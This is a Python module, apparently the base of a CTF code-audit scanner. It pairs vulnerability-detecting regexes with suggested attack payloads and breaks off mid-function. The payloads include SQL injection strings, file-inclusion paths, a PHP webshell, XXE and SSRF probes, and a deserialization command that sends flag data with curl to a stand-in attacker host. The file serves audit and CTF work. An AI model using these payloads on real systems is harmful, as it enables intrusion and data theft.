"""
tools/audit/base.py — CTF 代码审计基模块

提供:
  - AuditResult 数据模型
  - Scanner 基类（正则 + 元数据模式匹配）
  - 跨语言通用漏洞模式集合
  - run() 一键扫描入口
  - merge_results() 去重 + 排序
"""

from __future__ import annotations

import platform
import re
import os

IS_WINDOWS = platform.system() == "Windows"
import dataclasses
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Iterator, Optional

# ---------------------------------------------------------------------------
# AuditResult — 一条审计发现
# ---------------------------------------------------------------------------


@dataclass
class AuditResult:
    """代码审计发现的数据模型"""

    vulnerability: str       # 漏洞名称
    severity: str            # critical / high / medium / low
    line: int                # 源代码行号（1-based）
    snippet: str             # 触发匹配的代码片段
    confidence: float        # 置信度 0~1
    description: str         # 中文描述
    suggested_payload: str   # CTF 建议 payload
    cwe: str                 # CWE 编号（如 "CWE-78"）
    references: list[str]    # 参考资料 / 链接 / ctfhub_*.md 路径

    def __post_init__(self) -> None:
        assert self.severity in ("critical", "high", "medium", "low"), (
            f"Invalid severity: {self.severity!r}"
        )
        assert 0.0 <= self.confidence <= 1.0, (
            f"Confidence out of range: {self.confidence}"
        )

    def to_dict(self) -> dict[str, Any]:
        """转为可序列化的字典"""
        return dataclasses.asdict(self)


# ---------------------------------------------------------------------------
# AuditPattern — 模式定义
# ---------------------------------------------------------------------------


@dataclass
class AuditPattern:
    """单个扫描模式的定义"""

    name: str                     # 模式/漏洞名称
    regex: str                    # 正则表达式
    severity: str                 # critical / high / medium / low
    description: str              # 中文描述
    cwe: str                      # CWE 编号
    suggested_payload: str        # CTF 建议 payload
    references: list[str]         # 参考资料
    confidence: float = 0.7       # 默认置信度
    flags: int = re.MULTILINE     # 正则 flag
    languages: list[str] | None = None  # None 表示通用

    def compile(self) -> re.Pattern:
        return re.compile(self.regex, self.flags)


# ---------------------------------------------------------------------------
# 跨语言通用漏洞模式集合
# ---------------------------------------------------------------------------

COMMON_PATTERNS: list[AuditPattern] = [
    # ── 硬编码凭据 ──────────────────────────────────────────────────────
    AuditPattern(
        name="Hardcoded Password",
        regex=r'(?i)(password|passwd|pwd|secret|api_key|api[_-]?secret)\s*[=:]\s*["\'](?!\s*["\']).{4,}',
        severity="critical",
        confidence=0.85,
        description="源代码中硬编码了密码或 API 密钥，可直接用于登录或身份伪造。",
        cwe="CWE-798",
        suggested_payload="使用硬编码凭据直接登录目标服务。",
        references=["https://cwe.mitre.org/data/definitions/798.html"],
    ),
    AuditPattern(
        name="Hardcoded Token",
        regex=r'(?i)(token|access_token|auth_token|session_key)\s*[=:]\s*["\'][A-Za-z0-9_\-]{16,}',
        severity="high",
        confidence=0.80,
        description="发现硬编码令牌，可能用于 API 鉴权绕过。",
        cwe="CWE-798",
        suggested_payload="提取令牌值用于请求头 Authorization: Bearer <token>。",
        references=["https://cwe.mitre.org/data/definitions/798.html"],
    ),
    # ── 动态代码执行 ────────────────────────────────────────────────────
    AuditPattern(
        name="eval() Execution",
        regex=r'\beval\s*\(\s*["\']|eval\s*\(\s*\$_\s*(GET|POST|REQUEST|SERVER)',
        severity="critical",
        confidence=0.95,
        description="eval() 直接执行用户可控字符串，可导致远程代码执行（RCE）。",
        cwe="CWE-95",
        suggested_payload="; system('cat /flag'); // 或闭合上下文注入任意 PHP 代码。",
        references=["https://cwe.mitre.org/data/definitions/95.html"],
    ),
    AuditPattern(
        name="exec() / system() Call",
        regex=r'\b(exec|system|passthru|pcntl_exec|shell_exec)\s*\(',
        severity="critical",
        confidence=0.90,
        description="直接调用命令执行函数，若参数可控则导致 RCE。",
        cwe="CWE-78",
        suggested_payload=";cat /flag 或 |id 测试命令注入。",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
    ),
    AuditPattern(
        name="popen / subprocess Shell",
        regex=r'\b(popen|subprocess\.(call|run|Popen|check_output))\s*\(',
        severity="critical",
        confidence=0.85,
        description="使用 popen/subprocess 且 shell=True 时存在命令注入风险。",
        cwe="CWE-78",
        suggested_payload=";cat /flag 或 $(cat /flag) 测试注入。",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
    ),
    AuditPattern(
        name="os.system / os.popen",
        regex=r'\bos\.(system|popen)\s*\(',
        severity="critical",
        confidence=0.90,
        description="os.system/os.popen 执行系统命令，参数可控则导致 RCE。",
        cwe="CWE-78",
        suggested_payload=";cat /flag 测试命令注入。",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
    ),
    AuditPattern(
        name="Backtick Command Execution",
        regex=r'`[^`]*\$_(GET|POST|REQUEST|SERVER|COOKIE)',
        severity="critical",
        confidence=0.95,
        description="反引号内包含用户输入，PHP 会将其作为 shell 命令执行。",
        cwe="CWE-78",
        suggested_payload="`cat /flag` 或 `id` 确认注入。",
        references=["https://cwe.mitre.org/data/definitions/78.html"],
    ),
    AuditPattern(
        name="assert() Code Execution",
        regex=r'\bassert\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="critical",
        confidence=0.90,
        description="PHP assert() 在旧版本中会执行字符串参数内的代码。",
        cwe="CWE-95",
        suggested_payload="');system('cat /flag');//",
        references=["https://cwe.mitre.org/data/definitions/95.html"],
    ),
    AuditPattern(
        name="create_function Injection",
        regex=r'\bcreate_function\s*\(',
        severity="critical",
        confidence=0.85,
        description="PHP create_function() 内部执行代码，参数可控可导致 RCE。",
        cwe="CWE-95",
        suggested_payload="}system('cat /flag');//",
        references=["https://cwe.mitre.org/data/definitions/95.html"],
    ),
    AuditPattern(
        name="preg_replace /e Modifier",
        regex=r'preg_replace\s*\([\s\S]{0,50}?[\'"]e[\'"]?\s*[),]',
        severity="critical",
        confidence=0.95,
        description="PHP preg_replace 的 /e 修饰符会把 replacement 当作代码执行（PHP <7）。",
        cwe="CWE-95",
        suggested_payload="preg_replace('/.*/e', 'system(\"cat /flag\")', $input);",
        references=["https://cwe.mitre.org/data/definitions/95.html"],
    ),
    # ── SQL 注入 ──────────────────────────────────────────────────────
    AuditPattern(
        name="SQL Injection — String Concatenation",
        regex=r'(?i)(SELECT|INSERT|UPDATE|DELETE).{0,200}?\$_\s*(GET|POST|REQUEST)\s*\[',
        severity="critical",
        confidence=0.90,
        description="SQL 查询中直接拼接用户输入，导致 SQL 注入。",
        cwe="CWE-89",
        suggested_payload="' OR '1'='1' -- -  或  ' UNION SELECT 1,2,@@version -- -",
        references=["https://cwe.mitre.org/data/definitions/89.html"],
    ),
    AuditPattern(
        name="SQL Injection — f-string/format",
        regex=r'(?i)(cursor\.execute|query|db\.execute|mysql_query|mysqli_query|sqlsrv_query|pg_query)\s*\(\s*(f["\']|f\'|\.format\(|%\(|\+ )',
        severity="critical",
        confidence=0.85,
        description="使用 f-string / format / 拼接构造 SQL，存在注入风险。",
        cwe="CWE-89",
        suggested_payload="' OR 1=1 -- - 闭合注入。",
        references=["https://cwe.mitre.org/data/definitions/89.html"],
    ),
    # ── SSTI ──────────────────────────────────────────────────────────
    AuditPattern(
        name="Server-Side Template Injection",
        regex=r'render_template_string|render\(.*\{\{.*\}\}|\.format\(.*\{.*\}.*\)|%s\s*%|string\.Template',
        severity="high",
        confidence=0.75,
        description="服务端模板注入，用户输入被直接传入模板引擎。",
        cwe="CWE-1336",
        suggested_payload="{{ config }} 或 {{ ''.__class__.__mro__[1].__subclasses__() }} 探测。",
        references=["https://cwe.mitre.org/data/definitions/1336.html"],
    ),
    AuditPattern(
        name="Jinja2 SSTI",
        regex=r'Jinja2|jinja2|flask.*render_template_string',
        severity="high",
        confidence=0.80,
        description="Flask/Jinja2 模板注入，可读取配置及 RCE。",
        cwe="CWE-1336",
        suggested_payload="{{config}} / {{''.__class__.__mro__[2].__subclasses__()}}",
        references=["https://cwe.mitre.org/data/definitions/1336.html"],
    ),
    # ── 文件包含 ─────────────────────────────────────────────────────
    AuditPattern(
        name="Local File Inclusion (LFI)",
        regex=r'\b(include|require|include_once|require_once)\s*\(\s*\$_\s*(GET|POST|REQUEST|COOKIE)',
        severity="critical",
        confidence=0.90,
        description="文件包含函数使用了用户输入的路径，可读取任意文件。",
        cwe="CWE-98",
        suggested_payload="../../../etc/passwd 或 php://filter/convert.base64-encode/resource=index.php",
        references=["https://cwe.mitre.org/data/definitions/98.html"],
    ),
    AuditPattern(
        name="Remote File Inclusion (RFI)",
        regex=r'\b(include|require)\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="critical",
        confidence=0.85,
        description="用户输入直接控制 include/require 路径，可加载远程恶意脚本。",
        cwe="CWE-98",
        suggested_payload="http://attacker.com/shell.txt?",
        references=["https://cwe.mitre.org/data/definitions/98.html"],
    ),
    AuditPattern(
        name="file_get_contents User Input",
        regex=r'file_get_contents\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="high",
        confidence=0.85,
        description="file_get_contents 参数来自用户输入，可读取任意文件或 SSRF。",
        cwe="CWE-73",
        suggested_payload="php://filter/convert.base64-encode/resource=config.php",
        references=["https://cwe.mitre.org/data/definitions/73.html"],
    ),
    # ── SSRF ──────────────────────────────────────────────────────────
    AuditPattern(
        name="SSRF — curl with User Input",
        regex=r'curl_\w*\s*\(.*\$_\s*(GET|POST|REQUEST)',
        severity="high",
        confidence=0.85,
        description="curl 请求 URL 来自用户输入，可导致 SSRF 攻击内网服务。",
        cwe="CWE-918",
        suggested_payload="http://127.0.0.1:6379 或 file:///etc/passwd",
        references=["https://cwe.mitre.org/data/definitions/918.html"],
    ),
    AuditPattern(
        name="SSRF — requests.get(user_url)",
        regex=r'requests\.(get|post|put|delete|head)\s*\(\s*\$_\s*(GET|POST|REQUEST)|requests\.(get|post)\s*\(\s*request\s*\.',
        severity="high",
        confidence=0.80,
        description="Python requests 请求 URL 来自用户输入，可触发 SSRF。",
        cwe="CWE-918",
        suggested_payload="http://169.254.169.254/latest/meta-data/ (AWS元数据)",
        references=["https://cwe.mitre.org/data/definitions/918.html"],
    ),
    # ── 反序列化 ──────────────────────────────────────────────────────
    AuditPattern(
        name="PHP Unserialize",
        regex=r'\bunserialize\s*\(\s*\$_\s*(GET|POST|REQUEST|COOKIE)',
        severity="critical",
        confidence=0.90,
        description="用户输入直接传入 unserialize()，可导致 PHP 反序列化 RCE。",
        cwe="CWE-502",
        suggested_payload="O:7:\"Exploit\":0:{} 配合 POP gadget chain。",
        references=["https://cwe.mitre.org/data/definitions/502.html"],
    ),
    AuditPattern(
        name="Python Pickle Deserialization",
        regex=r'pickle\.(load|loads)\s*\(',
        severity="high",
        confidence=0.85,
        description="使用 pickle 反序列化不可信数据，可导致任意代码执行。",
        cwe="CWE-502",
        suggested_payload="__reduce__ 构造 RCE payload。",
        references=["https://cwe.mitre.org/data/definitions/502.html"],
    ),
    AuditPattern(
        name="yaml.load Unsafe",
        regex=r'yaml\.load\s*\(',
        severity="high",
        confidence=0.80,
        description="yaml.load() 默认使用 unsafe 加载器，可导致代码执行。应使用 yaml.safe_load()。",
        cwe="CWE-502",
        suggested_payload="!!python/object/apply:os.system ['cat /flag']",
        references=["https://cwe.mitre.org/data/definitions/502.html"],
    ),
    # ── 路径遍历 ──────────────────────────────────────────────────────
    AuditPattern(
        name="Path Traversal",
        regex=r'(\.\./|\.\.\\|base64_decode|urldecode).*\.\.',
        severity="high",
        confidence=0.80,
        description="路径遍历漏洞，可读取服务器任意文件。",
        cwe="CWE-22",
        suggested_payload="../../../../etc/passwd 或 ../../../flag",
        references=["https://cwe.mitre.org/data/definitions/22.html"],
    ),
    AuditPattern(
        name="Path Traversal — open/read",
        regex=r'\b(open|fopen|file_get_contents|readfile|copy|rename|unlink|file_put_contents)\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="high",
        confidence=0.85,
        description="文件操作函数使用用户输入路径，导致任意文件读取/写入。",
        cwe="CWE-22",
        suggested_payload="../../../etc/passwd",
        references=["https://cwe.mitre.org/data/definitions/22.html"],
    ),
    # ── 文件上传 ──────────────────────────────────────────────────────
    AuditPattern(
        name="Insecure File Upload",
        regex=r'(?i)(move_uploaded_file|upload|$_FILES)',
        severity="high",
        confidence=0.65,
        description="文件上传函数，若未校验后缀名/内容类型，可上传 webshell。",
        cwe="CWE-434",
        suggested_payload="上传 shell.php 包含 <?php system($_GET['cmd']); ?>",
        references=["https://cwe.mitre.org/data/definitions/434.html"],
    ),
    # ── 弱哈希 ────────────────────────────────────────────────────────
    AuditPattern(
        name="Weak Hash Algorithm (MD5/SHA1)",
        regex=r'(?i)\b(md5|sha1)\s*\(',
        severity="medium",
        confidence=0.70,
        description="使用 MD5/SHA1 进行安全敏感哈希，易碰撞或彩虹表破解。",
        cwe="CWE-327",
        suggested_payload="PHP 中 md5('QNKCDZO') == 0e... 类型转换绕过。",
        references=["https://cwe.mitre.org/data/definitions/327.html"],
    ),
    AuditPattern(
        name="MD5/SHA1 Loose Comparison",
        regex=r'(?i)md5\s*\(\s*\$_\s*(GET|POST|REQUEST).{0,20}==\s*md5|md5.*==.*0e\d{5,}',
        severity="high",
        confidence=0.85,
        description="PHP 中 `md5($_GET['a']) == md5($_GET['b'])` 可利用 0e 碰撞绕过。",
        cwe="CWE-327",
        suggested_payload="a=QNKCDZO&b=s155964671a 两个 0e 开头值。",
        references=["https://cwe.mitre.org/data/definitions/327.html"],
    ),
    AuditPattern(
        name="strcmp() Bypass",
        regex=r'strcmp\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="medium",
        confidence=0.75,
        description="PHP strcmp() 在 PHP<8 传数组时返回 NULL，绕过等值判断。",
        cwe="CWE-1025",
        suggested_payload="?password[]= 传入数组使 strcmp 返回 NULL。",
        references=["https://cwe.mitre.org/data/definitions/1025.html"],
    ),
    # ── PHP 类型混淆 ─────────────────────────────────────────────────
    AuditPattern(
        name="PHP Loose Comparison (== vs ===)",
        regex=r'(?i)\$_\s*(GET|POST|REQUEST)\s*\[.{0,50}\]\s*==\s*["\']',
        severity="medium",
        confidence=0.70,
        description="PHP == 类型转换宽松比较，可利用数字/字符串特性绕过。",
        cwe="CWE-1025",
        suggested_payload="?password=0 若目标判断 password==\"admin\"（0==\"admin\"为true）。",
        references=["https://cwe.mitre.org/data/definitions/1025.html"],
    ),
    AuditPattern(
        name="PHP Type Juggling — json",
        regex=r'json_decode.*true|json_decode.*assoc',
        severity="medium",
        confidence=0.60,
        description="JSON 解码后类型混淆，与 == 配合可绕过验证。",
        cwe="CWE-1025",
        suggested_payload='{"is_admin":true} 绕过 if($data["is_admin"]==true)。',
        references=["https://cwe.mitre.org/data/definitions/1025.html"],
    ),
    # ── XSS ───────────────────────────────────────────────────────────
    AuditPattern(
        name="Reflected XSS",
        regex=r'(?i)(echo|print|printf|write)\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="medium",
        confidence=0.75,
        description="未过滤的用户输入直接输出到页面，可注入任意 HTML/JavaScript。",
        cwe="CWE-79",
        suggested_payload="<script>alert(1)</script> 或 <img src=x onerror=alert(1)>",
        references=["https://cwe.mitre.org/data/definitions/79.html"],
    ),
    # ── XXE ───────────────────────────────────────────────────────────
    AuditPattern(
        name="XXE — External Entity Injection",
        regex=r'(?i)(simplexml_load_file|simplexml_load_string|DOMDocument\.load|domxml_open_mem)',
        severity="high",
        confidence=0.70,
        description="XML 解析器默认加载外部实体，可读取文件或 SSRF。",
        cwe="CWE-611",
        suggested_payload="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        references=["https://cwe.mitre.org/data/definitions/611.html"],
    ),
    # ── 格式字符串 ──────────────────────────────────────────────────
    AuditPattern(
        name="Format String Vulnerability",
        regex=r'(?i)(printf|sprintf|fprintf)\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="high",
        confidence=0.80,
        description="用户输入直接作为格式化字符串参数，可导致内存泄漏或写。",
        cwe="CWE-134",
        suggested_payload="%x.%x.%x.%n 测试栈读取。",
        references=["https://cwe.mitre.org/data/definitions/134.html"],
    ),
    # ── LDAP ──────────────────────────────────────────────────────────
    AuditPattern(
        name="LDAP Injection",
        regex=r'(?i)(ldap_search|ldap_list|ldap_read)\s*\(.*\$_\s*(GET|POST|REQUEST)',
        severity="high",
        confidence=0.80,
        description="LDAP 查询过滤器中包含未转义的用户输入。",
        cwe="CWE-90",
        suggested_payload="*)(uid=*))(|(uid=* 绕过 LDAP 过滤器。",
        references=["https://cwe.mitre.org/data/definitions/90.html"],
    ),
    # ── 竞争条件 ──────────────────────────────────────────────────
    AuditPattern(
        name="Race Condition — File Ops",
        regex=r'(?i)(file_put_contents|fwrite|fputs|tmpfile|tempnam).*\$_\s*(GET|POST|REQUEST)',
        severity="medium",
        confidence=0.55,
        description="文件写入操作之前有检查操作（TOCTOU），存在竞争条件。",
        cwe="CWE-367",
        suggested_payload="多线程并发发送请求以利用时间窗口。",
        references=["https://cwe.mitre.org/data/definitions/367.html"],
    ),
    # ── 不安全的随机数 ─────────────────────────────────────────────
    AuditPattern(
        name="Insecure Random — rand() for Security",
        regex=r'(?i)\brand\s*\(\s*\)\s*[;\)]|mt_rand\s*\(\s*\)\s*[;\)]',
        severity="medium",
        confidence=0.70,
        description="使用 rand()/mt_rand() 生成安全令牌或密钥，可预测。",
        cwe="CWE-338",
        suggested_payload="PHP mt_rand() 可使用 php_mt_seed 工具破解种子。",
        references=["https://cwe.mitre.org/data/definitions/338.html"],
    ),
    # ── 日志注入 ────────────────────────────────────────────────────
    AuditPattern(
        name="Log Injection / Log Poisoning",
        regex=r'(?i)(error_log|syslog|openlog)\s*\(.*\$_\s*(GET|POST|REQUEST|SERVER)',
        severity="medium",
        confidence=0.65,
        description="用户输入写入日志文件，可污染日志或结合 LFI 利用。",
        cwe="CWE-117",
        suggested_payload="写入 <?php system($_GET['c']); ?> 到日志后 LFI 包含日志文件。",
        references=["https://cwe.mitre.org/data/definitions/117.html"],
    ),
    # ── 敏感信息暴露 ────────────────────────────────────────────────
    AuditPattern(
        name="phpinfo() Disclosure",
        regex=r'\bphpinfo\s*\(\s*\)',
        severity="medium",
        confidence=0.80,
        description="phpinfo() 暴露大量服务器配置信息，用于信息收集。",
        cwe="CWE-200",
        suggested_payload="直接访问路径寻找 phpinfo() 输出，提取配置信息。",
        references=["https://cwe.mitre.org/data/definitions/200.html"],
    ),
    AuditPattern(
        name="Debug Mode Enabled",
        regex=r'(?i)(APP_DEBUG|DEBUG|DEVELOPMENT)\s*[=:]\s*(true|1|on)',
        severity="medium",
        confidence=0.75,
        description="调试模式开启，可能泄露详细错误信息和内部路径。",
        cwe="CWE-489",
        suggested_payload="触发错误观察堆栈信息。",
        references=["https://cwe.mitre.org/data/definitions/489.html"],
    ),
    # ── NoSQL 注入 ───────────────────────────────────────────────────
    AuditPattern(
        name="MongoDB NoSQL Injection",
        regex=r'(?i)(\$where|find\s*\(.*\$regex|find\s*\(.*\$ne)',
        severity="high",
        confidence=0.75,
        description="MongoDB 查询中可能存在的 NoSQL 注入点。",
        cwe="CWE-943",
        suggested_payload="?username[$ne]=x&password[$ne]=x  或 JSON 格式 {\"$gt\":\"\"}",
        references=["https://cwe.mitre.org/data/definitions/943.html"],
    ),
    # ── 开放重定向 ───────────────────────────────────────────────────
    AuditPattern(
        name="Open Redirect",
        regex=r'(?i)(header\s*\(\s*["\']Location|redirect|Location:|location\.href)\s*[:=]\s*\$_\s*(GET|POST|REQUEST)',
        severity="medium",
        confidence=0.75,
        description="重定向目标来自用户输入，可构造钓鱼链接。",
        cwe="CWE-601",
        suggested_payload="?url=http://evil.com 测试 302 跳转。",
        references=["https://cwe.mitre.org/data/definitions/601.html"],
    ),
    # ── 变量覆盖 ─────────────────────────────────────────────────────
    AuditPattern(
        name="PHP Variable Injection — extract()",
        regex=r'\bextract\s*\(\s*\$_\s*(GET|POST|REQUEST)',
        severity="high",
        confidence=0.85,
        description="extract($_GET/$_POST) 可覆盖任意已有变量。",
        cwe="CWE-621",
        suggested_payload="?GLOBALS[flag]=1 或 ?_SERVER=xxx 覆盖关键变量。",
        references=["https://cwe.mitre.org/data/definitions/621.html"],
    ),
    AuditPattern(
        name="PHP Variable Injection — parse_str()",
        regex=r'\bparse_str\s*\(\s*\$_\s*(GET|POST|REQUEST|SERVER)',
        severity="high",
        confidence=0.80,
        description="parse_str() 不传第二个参数时覆盖已有变量。",
        cwe="CWE-621",
        suggested_payload="?flag=1 直接覆盖未定义变量。",
        references=["https://cwe.mitre.org/data/definitions/621.html"],
    ),
    # ── include 中的 phar 反序列化 ─────────────────────────────────
    AuditPattern(
        name="Phar Deserialization",
        regex=r'(?i)(file_exists|is_dir|is_file|include|fopen|file_get_contents)\s*\(.*phar://',
        severity="critical",
        confidence=0.85,
        description="phar:// 协议触发元数据反序列化，无需 unserialize() 调用。",
        cwe="CWE-502",
        suggested_payload="phar://payload.phar 上传 phar 文件后触发。",
        references=["https://cwe.mitre.org/data/definitions/502.html"],
    ),
    # ── 正则拒绝服务 ────────────────────────────────────────────────
    AuditPattern(
        name="ReDoS — Unsanitized Regex",
        regex=r'preg_match\s*\(\s*["\'][\^\(].*\+\s*\)?\s*["\']\s*,\s*\$_\s*(GET|POST|REQUEST)',
        severity="low",
        confidence=0.50,
        description="用户输入直接传入正则匹配，存在 ReDoS 风险。",
        cwe="CWE-1333",
        suggested_payload="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! 测试超时。",
        references=["https://cwe.mitre.org/data/definitions/1333.html"],
    ),
    # ── HTTP 响应拆分 ──────────────────────────────────────────────
    AuditPattern(
        name="HTTP Response Splitting",
        regex=r'(?i)(header\s*\(.*\r\n|header\s*\(.*%0d%0a)',
        severity="high",
        confidence=0.80,
        description="HTTP 头中包含 CRLF，可导致响应拆分和缓存污染。",
        cwe="CWE-113",
        suggested_payload="%0d%0aSet-Cookie:%20admin=1",
        references=["https://cwe.mitre.org/data/definitions/113.html"],
    ),
    # ── 对象注入 ─────────────────────────────────────────────────────
    AuditPattern(
        name="PHP Object Injection — unserialize",
        regex=r'\bunserialize\s*\(',
        severity="high",
        confidence=0.80,
        description="unserialize() 的常规使用（不限于 GET/POST），也可能从数据库/缓存读取恶意数据。",
        cwe="CWE-502",
        suggested_payload="O:11:\"SomeClass\":0:{} 配合 __wakeup/__destruct 利用。",
        references=["https://cwe.mitre.org/data/definitions/502.html"],
    ),
    # ── 不安全的 Cookies ─────────────────────────────────────────────
    AuditPattern(
        name="Insecure Cookie — No HttpOnly/Secure",
        regex=r'(?i)setcookie\s*\(\s*["\'][^"\']*["\']\s*,\s*["\'][^"\']*["\']\s*\)',
        severity="low",
        confidence=0.60,
        description="setcookie() 未设置 httponly/secure 标志，易被 XSS 窃取。",
        cwe="CWE-1004",
        suggested_payload="通过 XSS 读取 document.cookie。",
        references=["https://cwe.mitre.org/data/definitions/1004.html"],
    ),
    # ── 不安全的反序列化 — Java ────────────────────────────────────
    AuditPattern(
        name="Java Deserialization",
        regex=r'(?i)(ObjectInputStream|readObject|readUnshared)\s*\(',
        severity="critical",
        confidence=0.80,
        description="Java 反序列化不可信数据，可利用 CommonsCollections 等链实现 RCE。",
        cwe="CWE-502",
        suggested_payload="ysoserial CommonsCollections5 \"curl http://attacker/$(cat /flag)\"",
        references=["https://cwe.mitre.org/data/definitions/502.html"],
    ),
    # ── Node.js 原型污染 ────────────────────────────────────────────
    AuditPattern(
        name="Prototype Pollution",
        regex=r'(?i)(merge|assign|clone|extend|copy)\s*\(\s*\{\}\s*,|\.__proto__\s*=|\.constructor\.prototype\s*=',
        severity="high",
        confidence=0.75,
        description="对象合并/克隆未过滤 __proto__ 或 constructor.prototype，可导致原型污染。",
        cwe="CWE-1321",
        suggested_payload='{"__proto__":{"isAdmin":true}}',
        references=["https://cwe.mitre.org/data/definitions/1321.html"],
    ),
    # ── GraphQL 注入 ────────────────────────────────────────────────
    AuditPattern(
        name="GraphQL Injection",
        regex=r'(?i)(graphql|gql)\s*\(\s*(f["\']|`|\.format|concat)',
        severity="high",
        confidence=0.65,
        description="GraphQL 查询字符串拼接用户输入，可注入恶意查询。",
        cwe="CWE-943",
        suggested_payload='{__schema{types{name}}} 或 注入闭合引号。',
        references=["https://cwe.mitre.org/data/definitions/943.html"],
    ),
    # ── Spring Boot Actuator ───────────────────────────────────────
    AuditPattern(
        name="Spring Boot Actuator Exposed",
        regex=r'(?i)/actuator|/actuator/health|/actuator/env|/actuator/dump',
        severity="medium",
        confidence=0.70,
        description="Spring Boot Actuator 端点未做访问控制，暴露敏感信息。",
        cwe="CWE-200",
        suggested_payload="访问 /actuator/env 获取环境变量，/actuator/heapdump 下载堆转储。",
        references=["https://cwe.mitre.org/data/definitions/200.html"],
    ),
    # ── CORS 配置错误 ─────────────────────────────────────────────
    AuditPattern(
        name="Permissive CORS",
        regex=r'(?i)Access-Control-Allow-Origin\s*:\s*\*',
        severity="low",
        confidence=0.50,
        description="CORS 允许所有来源，可能被用于跨域数据窃取。",
        cwe="CWE-942",
        suggested_payload="设置 Origin: evil.com 请求获取敏感数据。",
        references=["https://cwe.mitre.org/data/definitions/942.html"],
    ),
]

# 严重性排序（升序 = 优先）
_SEVERITY_ORDER: dict[str, int] = {
    "critical": 0,
    "high": 1,
    "medium": 2,
    "low": 3,
}


# ---------------------------------------------------------------------------
# Scanner — 代码审计扫描器
# ---------------------------------------------------------------------------


class Scanner:
    """代码审计扫描器

    用法:
        scanner = Scanner(source="...源码...", source_path="vuln.php")
        # 或
        scanner = Scanner(source=Path("/path/to/file.php"))
        results = scanner.scan()

        # 按语言过滤:
        results = scanner.scan(languages=["php"])
        results = scanner.scan(languages=["php", "python"])

        # 附加自定义模式:
        scanner.add_pattern(AuditPattern(...))
    """

    # 类级别默认模式列表（所有 Scanner 实例共享）
    builtin_patterns: list[AuditPattern] = list(COMMON_PATTERNS)

    def __init__(
        self,
        source: str | Path,
        source_path: str | Path | None = None,
    ) -> None:
        """初始化扫描器

        Args:
            source: 源代码字符串，或源码文件/目录的路径。
            source_path: 当 source 为字符串时，用于记录来源文件名。
        """
        if isinstance(source, Path) or (
            isinstance(source, str) and os.path.isfile(source)
        ):
            self.source_path = Path(source)
            self.code = self.source_path.read_text(
                encoding="utf-8", errors="replace"
            )
        else:
            self.code = source
            self.source_path = (
                Path(source_path) if source_path else Path("<string>")
            )

        self._lines: list[str] = []
        self._custom_patterns: list[AuditPattern] = []
        self._comment_lines: set[int] | None = None  # lazily computed

    # ── 属性 ──────────────────────────────────────────────────────────

    @property
    def lines(self) -> list[str]:
        """按行分割的源代码（惰性求值）"""
        if not self._lines:
            self._lines = self.code.split("\n")
        return self._lines

    @property
    def filename(self) -> str:
        """来源文件名"""
        return self.source_path.name

    @property
    def extension(self) -> str:
        """文件扩展名（小写）"""
        return self.source_path.suffix.lower()

    # ── 模式管理 ────────────────────────────────────────────────────

    def add_pattern(self, pattern: AuditPattern) -> None:
        """添加自定义扫描模式"""
        self._custom_patterns.append(pattern)

    def add_patterns(self, patterns: list[AuditPattern]) -> None:
        """批量添加自定义扫描模式"""
        self._custom_patterns.extend(patterns)

    @property
    def all_patterns(self) -> list[AuditPattern]:
        """所有生效的模式（内置 + 自定义）"""
        return self.builtin_patterns + self._custom_patterns

    # ── 扫描 ─────────────────────────────────────────────────────────

    def scan(
        self,
        languages: list[str] | None = None,
    ) -> list[AuditResult]:
        """执行扫描

        Args:
            languages: 可选的语言过滤器，如 ["php"]。None 表示不限制。

        Returns:
            匹配到的 AuditResult 列表（未排序/去重）。
        """
        results: list[AuditResult] = []
        # Build comment context once (lazy)
        comment_lines = self._get_comment_lines()

        for pattern in self.all_patterns:
            # 语言过滤
            if languages and pattern.languages is not None:
                if not any(lang in languages for lang in pattern.languages):
                    continue

            compiled = pattern.compile()

            for match in compiled.finditer(self.code):
                line_no = self._find_line(match.start())
                snippet = self._extract_snippet(match)
                confidence = pattern.confidence

                # Reduce confidence for matches inside comments/docstrings
                if line_no in comment_lines:
                    confidence = max(0.0, confidence - 0.2)

                results.append(
                    AuditResult(
                        vulnerability=pattern.name,
                        severity=pattern.severity,
                        line=line_no,
                        snippet=snippet,
                        confidence=confidence,
                        description=pattern.description,
                        suggested_payload=pattern.suggested_payload,
                        cwe=pattern.cwe,
                        references=list(pattern.references),
                    )
                )

        return results

    # ── 辅助 ─────────────────────────────────────────────────────────

    def _find_line(self, pos: int) -> int:
        """根据字符偏移量计算行号（1-based）"""
        return self.code[:pos].count("\n") + 1

    def _extract_snippet(
        self, match: re.Match, context_chars: int = 40
    ) -> str:
        """提取匹配上下文片段"""
        start = max(0, match.start() - context_chars)
        end = min(len(self.code), match.end() + context_chars)
        snippet = self.code[start:end]
        # 替换换行为可见字符
        snippet = snippet.replace("\n", "\\n").replace("\r", "\\r")
        # 过长时截断
        if len(snippet) > 120:
            snippet = snippet[:117] + "..."
        return snippet.strip()

    def __repr__(self) -> str:
        return f"<Scanner file={self.filename!r} patterns={len(self.all_patterns)}>"

    # ── Comment context detection ──────────────────────────────────────

    def _get_comment_lines(self) -> set[int]:
        """Lazily compute set of line numbers inside comments or docstrings.

        Uses extension-specific heuristics to detect:
          - Python: # comments, triple-quote docstrings
          - PHP: //, #, /* ... */
          - JS/TS/C/C++/Java: //, /* ... */
          - Shell/Ruby: # comments

        Returns:
            Set of 1-based line numbers in comment context.
        """
        if self._comment_lines is not None:
            return self._comment_lines

        comment_lines: set[int] = set()
        ext = self.extension
        lines = self.lines

        # Determine comment syntax by extension
        line_comment_prefixes: list[str] = []
        block_delimiters: tuple[str, str] | None = None
        docstring_quotes: tuple[str, str] = ('"""', "'''")

        if ext in (".py", ".pyw", ".pyi"):
            line_comment_prefixes = ["#"]
            block_delimiters = None  # no /* */ in Python
        elif ext in (".php", ".phtml", ".ctp", ".tpl"):
            line_comment_prefixes = ["//", "#"]
